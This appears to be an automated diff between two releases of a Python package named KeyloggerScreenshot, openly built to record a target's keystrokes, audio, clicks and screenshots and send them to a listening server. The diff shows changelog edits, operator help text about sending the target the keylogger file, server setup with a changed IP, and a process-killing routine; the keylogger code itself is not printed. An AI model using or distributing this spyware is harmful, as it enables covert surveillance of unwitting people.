# Comparing `tmp/KeyloggerScreenshot-0.2.9.1.tar.gz` & `tmp/KeyloggerScreenshot-0.3.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "KeyloggerScreenshot-0.2.9.1.tar", last modified: Fri Apr 14 22:51:02 2023, max compression
+gzip compressed data, was "KeyloggerScreenshot-0.3.0.tar", last modified: Thu Apr 20 09:22:35 2023, max compression
```

## Comparing `KeyloggerScreenshot-0.2.9.1.tar` & `KeyloggerScreenshot-0.3.0.tar`

### file list

```diff
@@ -1,32 +1,31 @@
-drwxrwxrwx   0        0        0        0 2023-04-14 22:51:02.834879 KeyloggerScreenshot-0.2.9.1/
--rw-rw-rw-   0        0        0     3339 2023-04-14 22:50:53.000000 KeyloggerScreenshot-0.2.9.1/CHANGELOG.txt
--rw-rw-rw-   0        0        0    11897 2023-04-09 20:16:17.000000 KeyloggerScreenshot-0.2.9.1/KLS_start.py
-drwxrwxrwx   0        0        0        0 2023-04-14 22:51:02.759193 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/
--rw-rw-rw-   0        0        0    11746 2023-04-14 22:50:53.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Keylogger_Target.py
--rw-rw-rw-   0        0        0     1917 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Port_data.py
--rw-rw-rw-   0        0        0     5750 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_keylogger.py
--rw-rw-rw-   0        0        0     2573 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_listener.py
--rw-rw-rw-   0        0        0     3883 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_photos.py
--rw-rw-rw-   0        0        0     1722 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_timer.py
--rw-rw-rw-   0        0        0     4712 2023-04-09 19:52:43.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Simulation_code.py
--rw-rw-rw-   0        0        0      277 2023-04-10 17:12:29.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-14 22:51:02.829096 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/
--rw-rw-rw-   0        0        0     9239 2023-04-14 22:51:02.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      680 2023-04-14 22:51:02.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-14 22:51:02.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       47 2023-04-14 22:51:02.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/requires.txt
--rw-rw-rw-   0        0        0       20 2023-04-14 22:51:02.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/top_level.txt
--rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.2.9.1/LISCENCE.txt
--rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.2.9.1/MANIFEST.in
--rw-rw-rw-   0        0        0     9239 2023-04-14 22:51:02.834879 KeyloggerScreenshot-0.2.9.1/PKG-INFO
--rw-rw-rw-   0        0        0     5137 2023-04-03 20:48:03.000000 KeyloggerScreenshot-0.2.9.1/README.md
--rw-rw-rw-   0        0        0     4745 2023-04-09 20:06:41.000000 KeyloggerScreenshot-0.2.9.1/Simulation_code.py
--rw-rw-rw-   0        0        0      388 2023-03-04 16:59:26.000000 KeyloggerScreenshot-0.2.9.1/client.py
--rw-rw-rw-   0        0        0      660 2023-04-12 18:51:47.000000 KeyloggerScreenshot-0.2.9.1/demon_server.py
--rw-rw-rw-   0        0        0    39374 2023-03-14 06:49:49.000000 KeyloggerScreenshot-0.2.9.1/img_1.png
--rw-rw-rw-   0        0        0      923 2023-03-28 06:01:03.000000 KeyloggerScreenshot-0.2.9.1/leo_gui.py
--rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.2.9.1/requirements.py
--rw-rw-rw-   0        0        0       42 2023-04-14 22:51:02.839456 KeyloggerScreenshot-0.2.9.1/setup.cfg
--rw-rw-rw-   0        0        0     1077 2023-04-14 22:50:53.000000 KeyloggerScreenshot-0.2.9.1/setup.py
--rw-rw-rw-   0        0        0      194 2023-04-14 22:40:07.000000 KeyloggerScreenshot-0.2.9.1/target.py
--rw-rw-rw-   0        0        0      379 2023-04-14 22:38:45.000000 KeyloggerScreenshot-0.2.9.1/test.py
+drwxrwxrwx   0        0        0        0 2023-04-20 09:22:35.518975 KeyloggerScreenshot-0.3.0/
+-rw-rw-rw-   0        0        0     3552 2023-04-20 09:19:21.000000 KeyloggerScreenshot-0.3.0/CHANGELOG.txt
+-rw-rw-rw-   0        0        0    12113 2023-04-20 09:11:01.000000 KeyloggerScreenshot-0.3.0/KLS_start.py
+drwxrwxrwx   0        0        0        0 2023-04-20 09:22:35.484232 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/
+-rw-rw-rw-   0        0        0    11746 2023-04-14 22:50:53.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Keylogger_Target.py
+-rw-rw-rw-   0        0        0     1917 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Port_data.py
+-rw-rw-rw-   0        0        0     5750 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_keylogger.py
+-rw-rw-rw-   0        0        0     2573 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_listener.py
+-rw-rw-rw-   0        0        0     3883 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_photos.py
+-rw-rw-rw-   0        0        0     1722 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_timer.py
+-rw-rw-rw-   0        0        0     5184 2023-04-20 08:15:29.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Simulation_code.py
+-rw-rw-rw-   0        0        0      277 2023-04-10 17:12:29.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/__init__.py
+drwxrwxrwx   0        0        0        0 2023-04-20 09:22:35.515474 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/
+-rw-rw-rw-   0        0        0     9450 2023-04-20 09:22:35.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      661 2023-04-20 09:22:35.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-20 09:22:35.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       47 2023-04-20 09:22:35.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       20 2023-04-20 09:22:35.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.3.0/LISCENCE.txt
+-rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.3.0/MANIFEST.in
+-rw-rw-rw-   0        0        0     9450 2023-04-20 09:22:35.517995 KeyloggerScreenshot-0.3.0/PKG-INFO
+-rw-rw-rw-   0        0        0     5137 2023-04-03 20:48:03.000000 KeyloggerScreenshot-0.3.0/README.md
+-rw-rw-rw-   0        0        0      388 2023-03-04 16:59:26.000000 KeyloggerScreenshot-0.3.0/client.py
+-rw-rw-rw-   0        0        0      662 2023-04-20 06:44:28.000000 KeyloggerScreenshot-0.3.0/demon_server.py
+-rw-rw-rw-   0        0        0    39374 2023-03-14 06:49:49.000000 KeyloggerScreenshot-0.3.0/img_1.png
+-rw-rw-rw-   0        0        0      923 2023-03-28 06:01:03.000000 KeyloggerScreenshot-0.3.0/leo_gui.py
+-rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.3.0/requirements.py
+-rw-rw-rw-   0        0        0       42 2023-04-20 09:22:35.519956 KeyloggerScreenshot-0.3.0/setup.cfg
+-rw-rw-rw-   0        0        0     1075 2023-04-20 09:21:26.000000 KeyloggerScreenshot-0.3.0/setup.py
+-rw-rw-rw-   0        0        0      196 2023-04-20 07:58:37.000000 KeyloggerScreenshot-0.3.0/target.py
+-rw-rw-rw-   0        0        0      409 2023-04-20 08:15:29.000000 KeyloggerScreenshot-0.3.0/test.py
```

### Comparing `KeyloggerScreenshot-0.2.9.1/CHANGELOG.txt` & `KeyloggerScreenshot-0.3.0/CHANGELOG.txt`

 * *Files 13% similar despite different names*

```diff
@@ -136,8 +136,12 @@
 - New help instruction on KLS_start on GitHub
 
 0.2.9.1 (15/04/2023)
 --------------------
 - Data which the target has pasted will now be shown on the server
 - Documentation incoming
 
-
+0.3.0 (20/04/2023)
+- Simulation now stops after stop button is pressed
+- Bug fixes
+- New Code on "Simulation_code.py" and on "KLS_Start.py"
+- New files on github https://github.com/Kill0geR/KeyloggerScreenshot
```

### Comparing `KeyloggerScreenshot-0.2.9.1/KLS_start.py` & `KeyloggerScreenshot-0.3.0/KLS_start.py`

 * *Files 3% similar despite different names*

```diff
@@ -276,8 +276,8 @@
 
     if "-help" in lst:
         print(gui)
         print(
             "\n-aip INSERT THE SERVERS IP\n-s   SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET\n-sim ACTIVATES SIMULATION\n-phs OPENS A LINK WHEN THE KEYLOGGER IS EXECUTED\n\n\nIF 'Simulation_code.py' IS IN YOUR DIRECTORY YOU CAN SIMULATE THE CLICKS THE TARGET HAS MADE IF IT HASN'T WORKD ON THE ACTUAL CODE")
 
 except OSError:
-    print('CHECK YOUR IP-ADDRESS WITH "ipconfig" ON WINDOWS AND "ifconfig" ON LINUX')
+    print('CHECK YOUR IP-ADDRESS WITH "ipconfig" ON WINDOWS AND "ifconfig" ON LINUX\n\nIF YOU HAVE THE CORRECT IP ADDRESSS AND IT STILL DOESNT WORK YOU CAN MODIFY YOUR IP ON "keylogger_server.py" AND "keylogger_target.py".\nAFTER THAT YOU CAN SEND THE TARGET OBVIOUSLY THE FILE "keylogger_target.py"')
```

### Comparing `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Keylogger_Target.py` & `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Keylogger_Target.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Port_data.py` & `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Port_data.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_keylogger.py` & `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_keylogger.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_listener.py` & `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_listener.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_photos.py` & `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_photos.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_timer.py` & `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_timer.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Simulation_code.py` & `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Simulation_code.py`

 * *Files 10% similar despite different names*

```diff
@@ -3,14 +3,15 @@
 import sys
 import os
 import ast
 import time
 import PIL.Image
 import tkinter as tk
 import BetterPrinting as bp
+import subprocess
 
 class Simulation:
 
     @staticmethod
     def countdown():
         global seconds
         global startbutton
@@ -52,14 +53,24 @@
         tkWindow.mainloop()
 
     @staticmethod
     def changecol():  # This function is here to if the simulation has ended
         startbutton.configure(bg="red")
         # This is the button
         startbutton["text"] = "Stop simulation"
+        data = subprocess.check_output("tasklist")
+        str_data = str(data).split()
+        all_exe = [(exe.replace(r"K\\r\\n", "").replace(r"K\r\n", ""), str_data[idx + 1]) for idx, exe in enumerate(str_data) if ".exe" in exe]
+        photo = []
+        for task, pid in all_exe:
+            if task == "PhotosApp.exe":
+                photo.append((task, pid))
+
+        if photo:
+            os.system(f"taskkill /f /PID {photo[0][1]}")
         os._exit(0)
 
     @staticmethod
     def connection():
         print("Successful connection")
 
     @staticmethod
```

### Comparing `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/PKG-INFO` & `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.2.9.1
+Version: 0.3.0
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
 Keywords: KeyloggerScreenshot
 Classifier: Development Status :: 6 - Mature
@@ -328,8 +328,12 @@
 - New help instruction on KLS_start on GitHub
 
 0.2.9.1 (15/04/2023)
 --------------------
 - Data which the target has pasted will now be shown on the server
 - Documentation incoming
 
-
+0.3.0 (20/04/2023)
+- Simulation now stops after stop button is pressed
+- Bug fixes
+- New Code on "Simulation_code.py" and on "KLS_Start.py"
+- New files on github https://github.com/Kill0geR/KeyloggerScreenshot
```

### Comparing `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/SOURCES.txt` & `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/SOURCES.txt`

 * *Files 12% similar despite different names*

```diff
@@ -1,13 +1,12 @@
 CHANGELOG.txt
 KLS_start.py
 LISCENCE.txt
 MANIFEST.in
 README.md
-Simulation_code.py
 client.py
 demon_server.py
 img_1.png
 leo_gui.py
 requirements.py
 setup.py
 target.py
```

### Comparing `KeyloggerScreenshot-0.2.9.1/LISCENCE.txt` & `KeyloggerScreenshot-0.3.0/LISCENCE.txt`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9.1/PKG-INFO` & `KeyloggerScreenshot-0.3.0/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.2.9.1
+Version: 0.3.0
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
 Keywords: KeyloggerScreenshot
 Classifier: Development Status :: 6 - Mature
@@ -328,8 +328,12 @@
 - New help instruction on KLS_start on GitHub
 
 0.2.9.1 (15/04/2023)
 --------------------
 - Data which the target has pasted will now be shown on the server
 - Documentation incoming
 
-
+0.3.0 (20/04/2023)
+- Simulation now stops after stop button is pressed
+- Bug fixes
+- New Code on "Simulation_code.py" and on "KLS_Start.py"
+- New files on github https://github.com/Kill0geR/KeyloggerScreenshot
```

### Comparing `KeyloggerScreenshot-0.2.9.1/README.md` & `KeyloggerScreenshot-0.3.0/README.md`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9.1/demon_server.py` & `KeyloggerScreenshot-0.3.0/demon_server.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 import KeyloggerScreenshot as ks
 import threading
 
-ip = "192.168.0.75"
+ip = "192.168.145.67"
 
 server_photos = ks.ServerPhotos(ip, 1111)
 
 server_keylogger = ks.ServerKeylogger(ip, 2222, simulater=True)
 
 server_listener = ks.ServerListener(ip, 3333)
```

### Comparing `KeyloggerScreenshot-0.2.9.1/img_1.png` & `KeyloggerScreenshot-0.3.0/img_1.png`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9.1/leo_gui.py` & `KeyloggerScreenshot-0.3.0/leo_gui.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9.1/requirements.py` & `KeyloggerScreenshot-0.3.0/requirements.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9.1/setup.py` & `KeyloggerScreenshot-0.3.0/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -6,15 +6,15 @@
     'Operating System :: Microsoft :: Windows :: Windows 10',
     'License :: OSI Approved :: MIT License',
     'Programming Language :: Python :: 3'
 ]
 
 setup(
     name='KeyloggerScreenshot',
-    version='0.2.9.1',
+    version='0.3.0',
     description='Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot',
     long_description_content_type="text/markdown",
     long_description=open('README.md').read() + '\n\n' + open('CHANGELOG.txt').read(),
     url='',
     author='Fawaz Bashiru',
     author_email='fawazbashiru@gmail.com',
     license='MIT',
```

